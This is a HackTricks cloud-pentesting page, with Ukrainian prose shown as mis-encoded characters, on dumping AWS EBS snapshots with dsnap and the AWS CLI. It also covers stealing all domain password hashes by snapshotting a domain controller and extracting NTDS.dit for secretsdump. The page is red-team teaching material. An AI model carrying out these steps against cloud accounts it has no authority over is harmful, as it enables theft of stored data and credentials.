# AWS - EBS Snapshot Dump

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑–Ω—ñ–º–∫–∞ –ª–æ–∫–∞–ª—å–Ω–æ
```bash
# Install dependencies
pip install 'dsnap[cli]'
brew install vagrant
brew install virtualbox

# Get snapshot from image
mkdir snap_wordir; cd snap_workdir
dsnap init
## Download a snapshot of the volume of that instance
## If no snapshot existed it will try to create one
dsnap get <instance-id>
dsnap --profile default --region eu-west-1 get i-0d706e33814c1ef9a
## Other way to get a snapshot
dsnap list #List snapshots
dsnap get snap-0dbb0347f47e38b96 #Download snapshot directly

# Run with vagrant
IMAGE="<download_file>.img" vagrant up #Run image with vagrant+virtuabox
IMAGE="<download_file>.img" vagrant ssh #Access the VM
vagrant destroy #To destoy

# Run with docker
git clone https://github.com/RhinoSecurityLabs/dsnap.git
cd dsnap
make docker/build
IMAGE="<download_file>.img" make docker/run #With the snapshot downloaded
```
{% hint style="danger" %}
**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É**, —â–æ `dsnap` –Ω–µ –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø—É–±–ª—ñ—á–Ω—ñ –∑–Ω—ñ–º–∫–∏. –©–æ–± –æ–±—ñ–π—Ç–∏ —Ü–µ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –∫–æ–ø—ñ—é –∑–Ω—ñ–º–∫–∞ —É —Å–≤–æ—î–º—É –æ—Å–æ–±–∏—Å—Ç–æ–º—É –∞–∫–∞—É–Ω—Ç—ñ —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –π–æ–≥–æ:
{% endhint %}

{% code overflow="wrap" %}
```bash
# Copy the snapshot
aws ec2 copy-snapshot --source-region us-east-2 --source-snapshot-id snap-09cf5d9801f231c57 --destination-region us-east-2 --description "copy of snap-09cf5d9801f231c57"

# View the snapshot info
aws ec2 describe-snapshots --owner-ids self --region us-east-2

# Download the snapshot. The ID is the copy from your account
dsnap --region us-east-2 get snap-027da41be451109da

# Delete the snapshot after downloading
aws ec2 delete-snapshot --snapshot-id snap-027da41be451109da --region us-east-2
```
{% endcode %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/](https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/)

–í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ –∑ Pacu, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –º–æ–¥—É–ª—å [ebs\_\_download\_snapshots](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#ebs__download_snapshots)

## –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑–Ω—ñ–º–∫–∞ –≤ AWS

{% code overflow="wrap" %}
```bash
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id snap-0b49342abd1bdcb89
```
{% endcode %}

**–ü—ñ–¥–∫–ª—é—á—ñ—Ç—å –π–æ–≥–æ –¥–æ EC2 VM –ø—ñ–¥ –≤–∞—à–∏–º –∫–æ–Ω—Ç—Ä–æ–ª–µ–º** (–≤—ñ–Ω –º–∞—î –±—É—Ç–∏ –≤ —Ç–æ–º—É –∂ —Ä–µ–≥—ñ–æ–Ω—ñ, —â–æ –π –∫–æ–ø—ñ—è —Ä–µ–∑–µ—Ä–≤–Ω–æ—ó –∫–æ–ø—ñ—ó):

–ö—Ä–æ–∫ 1: –ù–µ–æ–±—Ö—ñ–¥–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –æ–±'—î–º –≤–∞—à–æ–≥–æ –≤–∏–±—Ä–∞–Ω–æ–≥–æ —Ä–æ–∑–º—ñ—Ä—É —Ç–∞ —Ç–∏–ø—É, –ø–µ—Ä–µ–π—à–æ–≤—à–∏ –¥–æ EC2 ‚Äì> –û–±'—î–º–∏.

–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—é –¥—ñ—é, –≤–∏–∫–æ–Ω–∞–π—Ç–µ —Ç–∞–∫—ñ –∫–æ–º–∞–Ω–¥–∏:

* –°—Ç–≤–æ—Ä—ñ—Ç—å –æ–±'—î–º EBS –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä–∞.
* –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –æ–±'—î–º EBS —Ç–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ –æ–¥–Ω—ñ–π –∑–æ–Ω—ñ.

–ö—Ä–æ–∫ 2: –í–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—é "–ø—ñ–¥–∫–ª—é—á–∏—Ç–∏ –æ–±'—î–º", –∫–ª–∞—Ü–Ω—É–≤—à–∏ –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–æ–º—É –æ–±'—î–º—ñ.

–ö—Ä–æ–∫ 3: –í–∏–±–µ—Ä—ñ—Ç—å –µ–∫–∑–µ–º–ø–ª—è—Ä –∑ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—è –µ–∫–∑–µ–º–ø–ª—è—Ä–∞.

–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—é –¥—ñ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:

* –ü—ñ–¥–∫–ª—é—á—ñ—Ç—å –æ–±'—î–º EBS.

–ö—Ä–æ–∫ 4: –£–≤—ñ–π–¥—ñ—Ç—å –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ EC2 —Ç–∞ –ø–µ—Ä–µ–ª—ñ–∫—É–π—Ç–µ –¥–æ—Å—Ç—É–ø–Ω—ñ –¥–∏—Å–∫–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–∞–Ω–¥—É `lsblk`.

–ö—Ä–æ–∫ 5: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —î –¥–∞–Ω—ñ –Ω–∞ –æ–±'—î–º—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–∞–Ω–¥—É `sudo file -s /dev/xvdf`.

–Ø–∫—â–æ –≤–∏–≤—ñ–¥ –≤–∏—â–µ –Ω–∞–≤–µ–¥–µ–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ –ø–æ–∫–∞–∑—É—î "/dev/xvdf: data", —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –æ–±'—î–º –ø–æ—Ä–æ–∂–Ω—ñ–π.

–ö—Ä–æ–∫ 6: –§–æ—Ä–º–∞—Ç—É–π—Ç–µ –æ–±'—î–º —É —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É ext4, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–∞–Ω–¥—É `sudo mkfs -t ext4 /dev/xvdf`. –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ–æ—Ä–º–∞—Ç xfs, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–∞–Ω–¥—É `sudo mkfs -t xfs /dev/xvdf`. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞–±–æ ext4, –∞–±–æ xfs.

–ö—Ä–æ–∫ 7: –°—Ç–≤–æ—Ä—ñ—Ç—å –∫–∞—Ç–∞–ª–æ–≥ –Ω–∞ –≤–∞—à –≤–∏–±—ñ—Ä –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –æ–±'—î–º—É ext4. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞–∑–≤—É "newvolume".

–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—é –¥—ñ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É `sudo mkdir /newvolume`.

–ö—Ä–æ–∫ 8: –ü—ñ–¥–∫–ª—é—á—ñ—Ç—å –æ–±'—î–º –¥–æ –∫–∞—Ç–∞–ª–æ–≥—É "newvolume", –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–∞–Ω–¥—É `sudo mount /dev/xvdf /newvolume/`.

–ö—Ä–æ–∫ 9: –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –∫–∞—Ç–∞–ª–æ–≥—É "newvolume" —ñ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –¥–∏—Å–∫–æ–≤–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä, —â–æ–± –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –æ–±'—î–º—É.

–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—é –¥—ñ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ç–∞–∫—ñ –∫–æ–º–∞–Ω–¥–∏:

* –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ `/newvolume`.
* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –¥–∏—Å–∫–æ–≤–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–∞–Ω–¥—É `df -h .`. –í–∏–≤—ñ–¥ —Ü—ñ—î—ó –∫–æ–º–∞–Ω–¥–∏ –º–∞—î –ø–æ–∫–∞–∑—É–≤–∞—Ç–∏ –≤—ñ–ª—å–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä —É –∫–∞—Ç–∞–ª–æ–∑—ñ "newvolume".

–í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ –∑ Pacu, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –º–æ–¥—É–ª—å `ebs__explore_snapshots`.

## –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑–Ω—ñ–º–∫–∞ –≤ AWS (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ cli)

{% code overflow="wrap" %}
```bash
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id <snap-0b49342abd1bdcb89>

# Attach new volume to instance
aws ec2 attach-volume --device /dev/sdh --instance-id <INSTANCE-ID> --volume-id <VOLUME-ID>

# mount the snapshot from within the VM

sudo file -s /dev/sdh
/dev/sdh: symbolic link to `xvdh'

sudo file -s /dev/xvdh
/dev/xvdh: x86 boot sector; partition 1: ID=0xee, starthead 0, startsector 1, 16777215 sectors, extended partition table (last)\011, code offset 0x63

lsblk /dev/xvdh
NAME     MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
xvdh     202:112  0    8G  0 disk
‚îú‚îÄxvdh1  202:113  0  7.9G  0 part
‚îú‚îÄxvdh14 202:126  0    4M  0 part
‚îî‚îÄxvdh15 202:127  0  106M  0 part

sudo mount /dev/xvdh1 /mnt

ls /mnt
```
{% endcode %}

## Shadow Copy

–ë—É–¥—å-—è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á AWS, —è–∫–∏–π –º–∞—î –¥–æ–∑–≤—ñ–ª **`EC2:CreateSnapshot`**, –º–æ–∂–µ –≤–∫—Ä–∞—Å—Ç–∏ —Ö–µ—à—ñ –≤—Å—ñ—Ö –¥–æ–º–µ–Ω–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —Å—Ç–≤–æ—Ä–∏–≤—à–∏ **–∑–Ω—ñ–º–æ–∫ –ö–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞ –¥–æ–º–µ–Ω—É**, –∑–º–æ–Ω—Ç—É–≤–∞–≤—à–∏ –π–æ–≥–æ –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ, —è–∫–∏–º –≤—ñ–Ω –∫–µ—Ä—É—î, —ñ **–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞–≤—à–∏ NTDS.dit —Ç–∞ —Ä–µ—î—Å—Ç—Ä–æ–≤–∏–π —Ñ–∞–π–ª SYSTEM** –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑ –ø—Ä–æ–µ–∫—Ç–æ–º secretsdump –≤—ñ–¥ Impacket.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –∞—Ç–∞–∫–∏: [https://github.com/Static-Flow/CloudCopy](https://github.com/Static-Flow/CloudCopy) –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–¥–Ω—É –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö —Ç–µ—Ö–Ω—ñ–∫ –ø—ñ—Å–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–Ω—ñ–º–∫–∞.

## References

* [https://devopscube.com/mount-ebs-volume-ec2-instance/](https://devopscube.com/mount-ebs-volume-ec2-instance/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
